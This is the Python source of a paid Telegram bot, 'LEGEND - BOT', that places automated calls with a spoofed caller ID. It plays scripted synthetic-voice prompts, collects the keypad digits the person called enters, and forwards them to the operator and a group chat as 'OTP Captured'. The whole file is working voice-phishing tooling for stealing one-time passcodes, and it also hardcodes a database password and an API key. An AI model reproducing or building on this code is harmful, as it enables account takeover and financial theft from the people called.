import os
import logging
import requests
import threading
import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI, Request
from fastapi import HTTPException
from fastapi.responses import FileResponse
import uvicorn
import asyncio
import aiohttp
import azure.cognitiveservices.speech as speechsdk
from database import Database
from datetime import datetime, timedelta
from bot_config import bot, dp, TOKEN, AZURE_SPEECH_KEY, AZURE_SPEECH_REGION
import script  # Import the script module that contains the script creation logic
from aiogram.dispatcher import FSMContext

# Initialize FastAPI app
app = FastAPI()

# Initialize the database
db = Database(
    host="localhost",
    port_id=5432,
    database="mydatabase",
    user="postgres",
    password="root"
)

db.connect()
db.create_table()

# Load sensitive values from environment variables
API_KEY = os.getenv('API_KEY', '61e03c30-8466-46e3-8725-ca33aeae29b')
NGROK_URL = os.getenv('NGROK_URL', 'https://30f2-64-227-184-83.ngrok-free.app')
YOUR_ADMIN_IDS = [int(os.getenv('YOUR_ADMIN_ID1', '1384634165')), int(os.getenv('YOUR_ADMIN_ID2', '2099439835'))]
MAX_MESSAGE_LENGTH = 4096  # Telegram's maximum message length
GROUP_CHAT_ID = -4576153201  # Replace with your actual group chat ID

# Set up logging
logging.basicConfig(level=logging.INFO)

# Telegram bot setup
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# Subscription system
subscribed_users = set()

async def refresh_subscribed_users():
    global subscribed_users
    logging.info("Refreshing subscribed users...")
    try:
        db.cursor.execute("SELECT user_id FROM subscription_keys WHERE user_id IS NOT NULL")
        subscribed_users_list = db.cursor.fetchall()
        subscribed_users = {user[0] for user in subscribed_users_list}
        logging.info(f"Subscribed users refreshed: {subscribed_users}")
    except Exception as e:
        logging.error(f"Error refreshing subscribed users: {e}")

def load_subscribed_users():
    global subscribed_users
    logging.info("Loading subscribed users...")
    try:
        db.cursor.execute("SELECT user_id FROM subscription_keys WHERE user_id IS NOT NULL")
        subscribed_users_list = db.cursor.fetchall()
        subscribed_users = {user[0] for user in subscribed_users_list}
        logging.info(f"Subscribed users loaded: {subscribed_users}")
    except Exception as e:
        logging.error(f"Error loading subscribed users: {e}")

load_subscribed_users()

# Modify the webhook function to correctly manage the waiting state
@app.post('/webhook/{chatid}/{scriptid}/{maxdigits}/{secmax}')
async def webhook(chatid: int, scriptid: str, maxdigits: int, secmax: int, request: Request):
    data = await request.json()
    logging.info(f"Incoming webhook data for chatid {chatid}: {data}")

    if not data or 'state' not in data:
        return {"status": "error", "message": "Invalid data format"}

    event = data['state']
    logging.info(f"Event received for chatid {chatid}: {event}")

    session = db.get_session(chatid)
    if not session:
        logging.error(f"No session found in the database for chatid {chatid}")
        return {"status": "error", "message": "No session found for chatid"}

    uuid = session['uuid']
    logging.info(f"UUID retrieved from the database for chatid {chatid}: {uuid}")

    try:
        if event == 'call.ringing':
            logging.info(f"Call is ringing for user {chatid}")

        elif event == 'call.answered':
            # First gather audio (part 1) with maxdigits fixed at 1
            url = "https://articunoapi.com:8443/gather-audio"
            payload = {
                'uuid': uuid,
                'audiourl': f'http://www.lesna.online/scripts/{scriptid}/part1.wav',
                'maxdigits': '1'  # Fixed to 1 for the first gather
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload) as response:
                    logging.info(f"Gather audio response for chatid {chatid}: {response.status} - {await response.text()}")
            await send_message_to_user(chatid, "The call has been answered.")
        elif event == 'dtmf.gathered':
            digits = data.get('digits', '')
            logging.info(f"Digits gathered for chatid {chatid}: {digits}")

            if digits == '1':
                logging.info("User pressed 1 during the first gather")
                await send_message_to_user(chatid, "USER pressed 1.")
                await play_gather_audio(uuid, chatid, scriptid, maxdigits, secmax)  # Use dynamic maxdigits for further input
            else:
                # For the third gather, use secmax
                logging.info(f"Digits gathered: {digits}")
                group_message = (
                        f"🎉 <b>Digits Successfully Gathered!</b>\n\n"
                        f"🔢 <b>Captured Digits:</b> <code>{digits}</code>\n"
                    )
                await bot.send_message(
                       chat_id=GROUP_CHAT_ID,
                       text=group_message,
                       parse_mode="HTML"
                    )
                await ask_if_digits_correct(chatid, digits, scriptid, secmax)

        elif event == 'dtmf.entered':
            digit = data.get('digit', '')
            logging.info(f"Digit entered for chatid {chatid}: {digit}")
            await send_message_to_user(chatid, f"🔢 Digit Entered: {digit}")
        elif event == 'call.complete':
            logging.info(f"Call with chatid {chatid} and UUID {uuid} has been completed.")
            await bot.send_message(chatid, "📞 Call Status: The call has ENDED.")

        elif event == 'call.hangup':
            logging.info(f"Call hangup event received for chatid {chatid}.")

            # Extract the recording URL from the webhook data
            recording_url = data.get('recording_url')
            if recording_url:
                logging.info(f"Recording URL: {recording_url}")

                # Download the recording and send it to the Telegram user
                file_path = await download_recording(recording_url)
                if file_path:
                    await send_audio_to_user(chatid, file_path)
                    os.remove(file_path)  # Clean up the file after sending
                else:
                    await send_message_to_user(chatid, "Failed to download the recording.")
            else:
                logging.warning(f"No recording URL found in the webhook data for chatid {chatid}.")

        return {"status": "success"}

    except Exception as e:
        logging.error(f"Exception occurred: {e}")
        return {"status": "error", "message": str(e)}

@dp.message_handler(commands=['ban'])
async def ban_user(message: types.Message):
    # Check if the user is an admin
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You are not authorized to use this command.")
        return
    
    # Extract the user ID from the message
    try:
        user_id = int(message.get_args())
        # Ban the user
        db.ban_user(user_id)
        await message.reply(f"User {user_id} has been banned.")
    except ValueError:
        await message.reply("Please provide a valid user ID.")

# Command to unban a user
@dp.message_handler(commands=['unban'])
async def unban_user(message: types.Message):
    # Check if the user is an admin
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You are not authorized to use this command.")
        return
    
    # Extract the user ID from the message
    try:
        user_id = int(message.get_args())
        # Unban the user
        db.unban_user(user_id)
        await message.reply(f"User {user_id} has been unbanned.")
    except ValueError:
        await message.reply("Please provide a valid user ID.")

def is_admin(user_id):
    return user_id in YOUR_ADMIN_IDS

@dp.message_handler(commands=["broadcast"])
async def broadcast(message: types.Message):
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You don't have permission to use this command.")
        return

    broadcast_text = message.get_args()
    if not broadcast_text:
        await message.reply("Please provide a message to broadcast.")
        return

    # Debugging: Print the broadcast message
    print(f"Broadcast message: {broadcast_text}")

    try:
        users = db.get_all_user_ids()  # Ensure this method retrieves all user IDs
        print(f"Users to broadcast: {users}")  # Debugging: Print user IDs
        
        if not users:
            await message.reply("No users to broadcast to.")
            return
        
        for user_id in users:
            if not db.is_user_banned(user_id):  # Ensure this method checks if user is banned
                try:
                    await bot.send_message(user_id, broadcast_text)
                except Exception as e:
                    logging.error(f"Failed to send broadcast to user {user_id}: {e}")
            else:
                logging.info(f"User {user_id} is banned and will not receive the broadcast.")
                
        await message.reply("Broadcast sent.")
    except Exception as e:
        logging.error(f"Error during broadcasting: {e}")
        await message.reply("An error occurred while sending the broadcast.")


async def periodic_key_check():
    while True:
        await check_key_expiry()
        await asyncio.sleep(60 * 10)  # Check every 10 minutes

async def periodic_user_refresh():
    while True:
        await refresh_subscribed_users()
        await asyncio.sleep(10 * 60)  # Refresh every 15 minutes

@dp.callback_query_handler(lambda c: c.data == 'renew_subscription')
async def renew_subscription(callback_query: types.CallbackQuery):
    # Handle subscription renewal logic here
    await callback_query.message.answer('contact :- @heist986 or @FIRED_V1.')
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'help')
async def help(callback_query: types.CallbackQuery):
    # Provide help or additional instructions
    await callback_query.message.answer('For more help, please visit our support channel or contact our devloper.')
    await callback_query.answer()


@dp.message_handler(commands=["profile"])
async def profile(message: types.Message):
    user_id = message.from_user.id

    # Fetch the user's key details from the database
    key_details = db.get_key_details(user_id)
    
    if not key_details:
        await message.reply('You do not have an active subscription key.')
        return

    key, expiry_time_str = key_details
    expiry_time = datetime.strptime(expiry_time_str, "%Y-%m-%d %H:%M:%S")
    
    # Create an inline keyboard
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("Renew Subscription", callback_data="renew_subscription"),
        InlineKeyboardButton("Contact Support", url="https://t.me/heist986"),
        InlineKeyboardButton("Help", callback_data="help")
    )

    # Prepare the profile message with enhanced formatting
    message_text = (
        f"✨ **Subscription Key Profile** ✨\n\n"
        f"**🔑 Key:** `{key}`\n"
        f"**📅 Expiry Date:** {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"📢 **To Extend Your Subscription**\n"
        f"Click on 'Renew Subscription' to get a new key.\n\n"
        f"🛠️ **Need Help?**\n"
        f"Contact support or get help by clicking the appropriate buttons below.\n"
    )

    await message.reply(message_text, parse_mode='Markdown', reply_markup=keyboard)

  
async def play_audio(uuid, scriptid):
    audiourl = f"http://www.lesna.online/scripts/{scriptid}/part4.wav"
    url = "https://articunoapi.com:8443/play-audio"
    payload = {
        "uuid": uuid,
        "audiourl": audiourl
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response: 
                response.raise_for_status()  # Raises an exception for HTTP errors
                return await response.json()
    except aiohttp.ClientError as e:
        logging.error(f"Error playing audio for uuid {uuid} with audiourl {audiourl}: {e}")
        return None

@dp.message_handler(commands=['set_voicename'])
async def set_voicename(message: types.Message):
    voice_name = message.get_args()  # Assuming the voice name is passed as an argument
    if not voice_name:
        await message.reply("Please provide a voice name. Usage: /set_voicename <voice_name>")
        return
    
    user_id = message.from_user.id
    db.save_voice_name(user_id, voice_name)
    await message.reply(f"Voice name '{voice_name}' has been saved for your future scripts.")

@app.get("/scripts/{script_id}/{filename}")
async def get_script_file(script_id: str, filename: str):
    file_path = f"./scripts/{script_id}/{filename}"

    if not os.path.exists(file_path):
        logging.error(f"File not found: {file_path}")
        raise HTTPException(status_code=404, detail="File not found")
    
    if not os.access(file_path, os.R_OK):
        logging.error(f"File is not readable: {file_path}")
        raise HTTPException(status_code=403, detail="File is not readable")

    try:
        return FileResponse(path=file_path, media_type='audio/wav')
    except Exception as e:
        logging.error(f"Error serving file {file_path}: {e}")
        raise HTTPException(status_code=500, detail="Internal Server Error")

async def download_recording(url):
    """Downloads the recording from the given URL and saves it locally."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    file_name = url.split("/")[-1]  # Get the file name from the URL
                    file_path = os.path.join("record", file_name)

                    # Check if the directory exists, if not create it
                    if not os.path.exists("record"):
                        os.makedirs("record")

                    # Ensure the directory exists
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)

                    # Write the file
                    with open(file_path, 'wb') as f:
                        f.write(await response.read())

                    return file_path
                else:
                    logging.error(f"Failed to download the recording: {response.status}")
                    return None
    except Exception as e:
        logging.error(f"Error downloading recording: {e}")
        return None

async def send_audio_to_user(chatid, file_path):
    """Sends the downloaded audio file to the user."""
    try:
        with open(file_path, 'rb') as audio:
            await bot.send_audio(chatid, audio, caption="RECORDING")
        os.remove(file_path)    
        logging.info(f"Recording sent to chat_id {chatid}: {file_path}")
    except Exception as e:
        logging.error(f"Failed to send recording to chat_id {chatid}: {e}")

async def send_message_to_user(chat_id, message):
    try:
        await bot.send_message(chat_id, message)
        logging.info(f"Message sent to chat_id {chat_id}: {message}")
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chat_id}: {e}")

@dp.callback_query_handler(lambda c: c.data and (c.data.startswith('correct_') or c.data.startswith('wrong_')))
async def handle_digit_confirmation(callback_query: types.CallbackQuery):
    action, chatid, scriptid, secmax = callback_query.data.split('_')
    chatid = int(chatid)

    session = db.get_session(chatid)
    if not session:
        logging.error(f"No session found for chatid {chatid} when handling digit confirmation.")
        await callback_query.answer("Session not found.")
        return
    
    uuid = session['uuid']

    if action == 'correct':
        logging.info(f"User confirmed digits as correct for chatid {chatid}. Ending the call.")
        await callback_query.answer("Thank you, ending the call.")
        await async_hangup_call(uuid)  # End the call
        await bot.send_message(chatid, "The call has been successfully ended.")
    elif action == 'wrong':
        logging.info(f"User indicated digits were wrong for chatid {chatid}. Attempting to play the third script.")
        
        if not scriptid:
            logging.error(f"Failed to retrieve script ID for chatid {chatid}. Cannot play third script.")
            await callback_query.answer("Failed to retrieve script ID.")
            return
        
        await callback_query.answer("Playing the third script.")
        await play_third_script(uuid, chatid, scriptid, secmax)  # Pass secmax here as well



async def play_gather_audio(uuid, chatid, scriptid, maxdigits, secmax):
    audiourl = f"http://www.lesna.online/scripts/{scriptid}/part2.wav"
    url = "https://articunoapi.com:8443/gather-audio"
    payload = {
        'uuid': uuid,
        'audiourl': audiourl,
        'maxdigits': str(maxdigits)
    }

    logging.info(f"Attempting to gather audio for chatid {chatid} with scriptid {scriptid} for part 2")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()  # Ensure the request was successful
                data = await response.json()
                logging.debug(f"Gather audio response data: {data}")
                
                # Check if digits were gathered
                if data.get('event') == 'dtmf.gathered':
                    digits = data.get('digits', '')
                    logging.info(f"Digits gathered for chatid {chatid}: {digits}")
                    
                    group_message = (
                        f"🎉 <b>Digits Successfully Gathered!</b>\n\n"
                        f"🔢 <b>Captured Digits:</b> <code>{digits}</code>\n"
                    )
                    await bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=group_message,
                        parse_mode="HTML"
                    )

                    
                    # Immediately ask the user if the digits are correct
                    await ask_if_digits_correct(chatid, digits, scriptid, secmax)

                    # Automatically play the next audio
                    await play_audio(uuid, scriptid)  # Automatically trigger play_audio
                else:
                    logging.warning(f"No digits gathered or unexpected event: {data}")
                    await send_message_to_user(chatid, "No digits were entered. Please try again.")

    except aiohttp.ClientError as e:
        logging.error(f"Error gathering audio for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "Failed to gather audio. Please try again.")



async def play_third_script(uuid, chatid, scriptid, secmax):
    audiourl = f"http://www.lesna.online/scripts/{scriptid}/part3.wav"
    url = "https://articunoapi.com:8443/gather-audio"
    payload = {
        'uuid': uuid,
        'audiourl': audiourl,
        'maxdigits': str(secmax)
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()
                data = await response.json()
                if data.get('event') == 'dtmf.gathered':
                    digits = data.get('digits', '')
                    await bot.send_message(chat_id=GROUP_CHAT_ID, text=f"Gathered digits: {digits}")
                    await ask_if_digits_correct(chatid, digits, scriptid, secmax)  # Ensure maxdigits is included
    except aiohttp.ClientError as e:
        logging.error(f"Error playing third script for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "An error occurred while trying to play the third script. Please try again.")




async def ask_if_digits_correct(chatid, digits, scriptid, maxdigits):
    # Create the inline keyboard with buttons for "Correct" and "Wrong"
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("✅ Correct", callback_data=f'correct_{chatid}_{scriptid}_{maxdigits}'),
        InlineKeyboardButton("❌ Wrong", callback_data=f'wrong_{chatid}_{scriptid}_{maxdigits}')
    )
    
    # Format the message with a more visually appealing layout
    message_text = (
        f"🔢 <b>OTP Captured:</b> <code>{digits}</code>\n\n"
    )
    
    try:
        # Send the formatted message with the inline buttons
        await bot.send_message(chatid, message_text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chatid}: {e}")


@dp.callback_query_handler(lambda c: c.data and c.data.startswith('hangup_'))
async def handle_hangup(callback_query: types.CallbackQuery):
    uuid = callback_query.data.split('_')[1]  # Extract UUID from the callback data
    logging.info(f"Attempting to hang up call with UUID: {uuid}")

    # Call the async_hangup_call function
    result = await async_hangup_call(uuid)
    
    if 'error' in result:
        logging.error(f"Failed to hang up the call: {result['error']}")
        await callback_query.answer(f"Failed to hang up the call: {result['error']}")
    else:
        logging.info(f"Call with UUID {uuid} successfully hung up.")
        await callback_query.answer("The call has been successfully hung up.")


# Asynchronous hangup function
async def async_hangup_call(uuid):
    url = "https://articunoapi.com:8443/hangup"  # URL without the query parameter
    
    async with aiohttp.ClientSession() as session:
        try:
            logging.info(f"Sending hangup request to {url} with UUID: {uuid}")
            payload = {"uuid": uuid}  # JSON body containing the UUID
            async with session.post(url, json=payload) as response:  # Send the UUID in the body
                response_text = await response.text()
                logging.info(f"Hangup call response status: {response.status}")
                logging.info(f"Hangup call response content: {response_text}")
                
                # Check if the response status is 200 OK
                if response.status == 200:
                    return {"status": "success"}
                else:
                    logging.error(f"Hangup failed with status {response.status} and content: {response_text}")
                    return {"status": "failed", "response": response_text}
                
        except aiohttp.ClientError as e:
            logging.error(f"Client error occurred during hangup: {e}")
            return {"error": f"Client error occurred: {e}"}
        except Exception as e:
            logging.error(f"Unexpected error during hangup: {e}")
            return {"error": f"Unexpected error: {e}"}


async def hold_call(uuid):
    url = f"https://articunoapi.com:8443/hold?uuid={uuid}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url) as response:
                response.raise_for_status()
                return await response.json()
        except aiohttp.ClientError as e:
            logging.error(f"Error holding call: {e}")
            return None
#keycheck
async def check_key_expiry():
    all_keys = db.get_all_keys()
    current_time = datetime.utcnow()

    for key_data in all_keys:
        expiry_time = datetime.strptime(key_data['expiry_time'], "%Y-%m-%d %H:%M:%S")  # Assuming the expiry time is stored as a string
        if current_time > expiry_time:
            db.remove_key_and_user(key_data['key'], key_data['user_id'])
            print(f"Key {key_data['key']} for user {key_data['user_id']} has expired.")

async def create_call_api(api_key, callback_url, to_number, from_number, name, scriptname, chatid, maxdigits, secmax):
    try:
        url = "https://articunoapi.com:8443/create-call"
        webhook_url = f"{callback_url}/webhook/{chatid}/{scriptname}/{maxdigits}/{secmax}"
        payload = {
            "api_key": api_key,
            "callbackURL": webhook_url,
            "to_": to_number,
            "from_": from_number,
            "name": name,
            "maxdigits": maxdigits,  # Add maxdigits to the payload
            "secmax": secmax  # Add secmax to the payload
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()  # Raises an exception for 4xx/5xx errors
                data = await response.json()
                if 'uuid' in data:
                    return data
                else:
                    return None

    except aiohttp.ClientError as e:
        logging.error(f"Error creating call: {e}")
        return None


@dp.callback_query_handler(lambda c: c.data and c.data.startswith('recall_'))
async def handle_recall(callback_query: types.CallbackQuery):
    _, chatid, destination_number, caller_id, name, scriptname, maxdigits, secmax = callback_query.data.split('_')

    try:
        # Recreate the call using the same parameters
        response = await create_call_api(API_KEY, NGROK_URL, destination_number, caller_id, name, scriptname, chatid, maxdigits, secmax)
        
        if response and 'uuid' in response:
            uuid = response['uuid']
            db.store_session(int(chatid), uuid)  # Store the new UUID for the chat session

            # Create a new markup with Hangup and Recall buttons
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton('❌ Hangup', callback_data=f'hangup_{uuid}'))
            markup.add(InlineKeyboardButton('🔁 Recall', callback_data=f'recall_{chatid}_{destination_number}_{caller_id}_{name}_{scriptname}_{maxdigits}_{secmax}'))

            await callback_query.message.reply('Call recalled successfully!', reply_markup=markup)
        else:
            await callback_query.answer('Failed to recall the call. Please try again.')
    except Exception as e:
        logging.error(f"An error occurred during recall: {e}")
        await callback_query.answer('An error occurred during recall. Please try again.')


@dp.message_handler(commands=["create_call"])
async def create_call(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    
    try:
        args = message.text.split(' ')[1:]
        if len(args)!= 6:
            await message.reply('Invalid arguments. Please use /create_call destination_number caller_id name scriptname maxdigits')
            return
        
        destination_number, caller_id, name, scriptname, maxdigits, secmax = args
        response = await create_call_api(API_KEY, NGROK_URL, destination_number, caller_id, name, scriptname, message.chat.id, maxdigits, secmax)
        
        if response is not None:
            await message.reply('Call initiated successfully!')
            
            if 'uuid' in response:
                uuid = response['uuid']
                logging.info(f"Storing UUID {uuid} for chatid {message.chat.id}")
                db.store_session(message.chat.id, uuid)
                stored_session = db.get_session(message.chat.id)
                logging.info(f"Stored session retrieved: {stored_session}")
                if stored_session:
                    logging.info(f"Successfully stored and retrieved UUID: {stored_session['uuid']}")
                else:
                    logging.error("Failed to store session in the database.")
                
                # Create a markup with Hangup and Recall buttons
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton('❌ Hangup', callback_data=f'hangup_{uuid}'))
                markup.add(InlineKeyboardButton('🔁 Recall', callback_data=f'recall_{message.chat.id}_{destination_number}_{caller_id}_{name}_{scriptname}_{maxdigits}_{secmax}'))
                await message.reply('Call initiated successfully!', reply_markup=markup)
            else:
                await message.reply('Call failed to initiate.')
        else:
            await message.reply('Call failed to initiate.')
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        await message.reply('An error occurred. Please try again.')

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    user_first_name = message.from_user.first_name
    welcome_message = (
        f"✨ <b>Welcome to LEGEND - BOT</b> ✨\n\n"
        f"👋 <b>Hello, {user_first_name}!</b>\n"
        f"Welcome to <b>LEGEND - BOT</b>, your reliable partner for automated calling services. 🚀\n\n"
        f"💎 <i>Enjoy high-quality services at affordable prices!</i>\n\n"
        f"<b>🌟 Features Included:</b>\n"
        f"🔧 24/7 Customer Support\n"
        f"💳 Automated Payment System\n"
        f"📊 Live Panel Overview\n"
        f"🎭 Customizable Caller ID\n"
        f"📈 99.99% Uptime Guarantee\n"
        f"🛠️ Customizable Scripts\n\n"
        f"<b>🚀 Available Commands:</b>\n"
        f"🔸 /create_call <i>&lt;destination_number&gt; &lt;caller_id&gt; &lt;name&gt; &lt;scriptname&gt;</i>\n"
        f"🔸 /redeem <i>&lt;key&gt;</i> - Redeem with a key\n"
        f"🔸 /profile - View your profile\n"
        f"🔸 /create_script <i>&lt;part1&gt; &lt;part2&gt; &lt;part3&gt; &lt;part4&gt; &lt;part5&gt;</i>\n"
        f"🔸 /list_voices - List available voices\n"
        f"🔸 /set_voicename <i>&lt;voice_name&gt;</i> - Set voice name before creating a script\n\n"
        f"<i>Explore our bot and elevate your communication experience!</i> 🌐"
    )

    # Inline buttons
    inline_kb = InlineKeyboardMarkup(row_width=2)
    inline_kb.add(
        InlineKeyboardButton("📞 Support", url="https://t.me/LEGENDSNIZO"),
        InlineKeyboardButton("💰 Purchase", url="https://t.me/LEGENDRISHI"),
        InlineKeyboardButton("💰 Pricing", url="https://t.me/LEGENDRISHI")
    )

    await message.reply(welcome_message, parse_mode="HTML", reply_markup=inline_kb)


@dp.message_handler(commands=["redeem"])
async def subscribe(message: types.Message):
    try:
        key = message.text.split(" ")[1]
        db_key = db.get_key(key)
        if db_key:
            if db_key[1] is None:  # Check if the key has not been redeemed by any user yet
                db.update_key(key, message.chat.id, db_key[2])  # Update the key with the current user's ID
                subscribed_users.add(message.chat.id)
                response_message = (
                    "🎉 <b>Subscription Successful!</b>\n\n"
                    "✅ You have successfully subscribed to our service.\n"
                    "Enjoy all the premium features and benefits we offer! 🚀"
                )
                await message.reply(response_message, parse_mode="HTML")
            elif db_key[1] == message.chat.id:
                response_message = (
                    "🔔 <b>Already Subscribed</b>\n\n"
                    "ℹ️ You are already subscribed to our service. No need to subscribe again!"
                )
                await message.reply(response_message, parse_mode="HTML")
            else:
                response_message = (
                    "❌ <b>Key Already Redeemed</b>\n\n"
                    "⚠️ This subscription key has already been used by another user."
                )
                await message.reply(response_message, parse_mode="HTML")
        else:
            response_message = (
                "🚫 <b>Invalid Key</b>\n\n"
                "⚠️ The subscription key you entered is not valid. Please check and try again."
            )
            await message.reply(response_message, parse_mode="HTML")
    except IndexError:
        response_message = (
            "❗ <b>Missing Key</b>\n\n"
            "⚠️ Please provide a valid subscription key using the format: /redeem&lt;key&gt;"
        )
        await message.reply(response_message, parse_mode="HTML")


@dp.message_handler(commands=["generate_key"])
async def generate_key(message: types.Message):
    if message.chat.id not in YOUR_ADMIN_IDS:
        await message.reply('You are not authorized to generate subscription keys.')
        return
    
    try:
        # Extract and parse command arguments
        _, duration_str, unit = message.text.split(' ', 2)
        duration = int(duration_str)
        
        # Determine the expiry time based on unit (days or hours)
        if unit.lower() == 'days':
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit.lower() == 'hours':
            expiry_time = datetime.now() + timedelta(hours=duration)
        else:
            raise ValueError("Invalid unit. Use 'days' or 'hours'.")
        
        # Generate a secure random key
        key = os.urandom(16).hex()
        
        # Insert the key and expiry time into the database
        db.insert_key(key, None, expiry_time.strftime("%Y-%m-%d %H:%M:%S"))
        
        # Notify the user
        await message.reply(f'Generated subscription key: {key} (expires on {expiry_time.strftime("%Y-%m-%d %H:%M:%S")})')
    
    except (IndexError, ValueError) as e:
        await message.reply(f'Error: {e}. Please use /generate_key <duration> <days|hours>')


def get_available_voices():
    """Retrieve and return a list of available voices from Azure TTS."""
    try:
        speech_config = speechsdk.SpeechConfig(subscription=AZURE_SPEECH_KEY, region=AZURE_SPEECH_REGION)
        synthesizer = speechsdk.SpeechSynthesizer(speech_config=speech_config)
        
        voices = synthesizer.get_voices_async().get()
        
        if voices.reason == speechsdk.ResultReason.VoicesListRetrieved:
            return [voice for voice in voices.voices]
        else:
            print(f"Failed to retrieve voices. Reason: {voices.reason}")
            return []
    except Exception as e:
        print(f"Error retrieving voices: {e}")
        return []

@dp.message_handler(commands=["list_voices"])
async def list_voices(message: types.Message):
    # Fetch available voices
    available_voices = get_available_voices()

    if available_voices:
        # Group voices by country (locale)
        grouped_voices = {}
        for voice in available_voices:
            # Extract country code from locale
            country = voice.locale.split('-')[1].upper()
            if country not in grouped_voices:
                grouped_voices[country] = []
            grouped_voices[country].append(voice)

        # Filter to include only India, France, and USA
        allowed_countries = {'IN': 'India', 'FR': 'France', 'US': 'USA'}
        filtered_voices = {code: grouped_voices[code] for code in allowed_countries.keys() if code in grouped_voices}

        # Create inline keyboard with buttons for each allowed country
        keyboard = InlineKeyboardMarkup(row_width=2)
        for code, country_name in allowed_countries.items():
            if code in filtered_voices:
                button = InlineKeyboardButton(
                    text=f"{country_name} Voices ({len(filtered_voices[code])})",
                    callback_data=f"show_voices_{code}"
                )
                keyboard.add(button)

        # Send message with inline keyboard
        await message.reply(
            "🌍 <b>Select a country to view available voices:</b>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    
    else:
        await message.reply(
            "❌ <b>Failed to retrieve available voices.</b>",
            parse_mode="HTML"
        )

# Callback query handler for showing voices of a selected country
@dp.callback_query_handler(lambda c: c.data and c.data.startswith('show_voices_'))
async def show_voices(callback_query: types.CallbackQuery):
    country = callback_query.data.split('_')[-1]
    available_voices = get_available_voices()

    if available_voices:
        voices_in_country = [voice for voice in available_voices if voice.locale.split('-')[1].upper() == country]

        if voices_in_country:
            voice_list = "\n".join([f"🎤 <b>{voice.local_name}</b> ({voice.locale}) - <i>{voice.short_name}</i>" for voice in voices_in_country])
            await bot.send_message(callback_query.from_user.id, f"<b>{country} Voices:</b>\n\n{voice_list}", parse_mode="HTML")
        else:
            await bot.send_message(callback_query.from_user.id, f"❌ <b>No voices available for {country}.</b>", parse_mode="HTML")
    
    await callback_query.answer()


@dp.message_handler(commands=["create_script"])
async def create_script_command(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    await script.start_script_creation(message)

@dp.message_handler(lambda message: script.db.get_state(message.chat.id).get('script_id'))
async def handle_script_part(message: types.Message):
    await script.handle_part(message)

async def set_default_commands(dp):
    await dp.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("create_call", "Create a new call"),
        BotCommand("redeem", "Subscribe to the bot"),
        BotCommand("create_script", "Create a new script"),
        BotCommand("set_voicename", "set voice for script"),  # Ensure this command is listed here
        BotCommand("profile", "PROFILE"),
        BotCommand("list_voices", "list voice for script"),
    ])

async def run_bot_and_server():
    # Start the FastAPI server in a background task
    config = uvicorn.Config(app, host="0.0.0.0", port=5000)
    server = uvicorn.Server(config)
    loop = asyncio.get_event_loop()
    loop.create_task(server.serve())

    # Start bot polling in the main task
    await set_default_commands(dp)
    from aiogram import executor
    await dp.start_polling()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(check_key_expiry())
    loop.create_task(periodic_key_check())
    loop.create_task(periodic_user_refresh())
    loop.run_until_complete(run_bot_and_server())


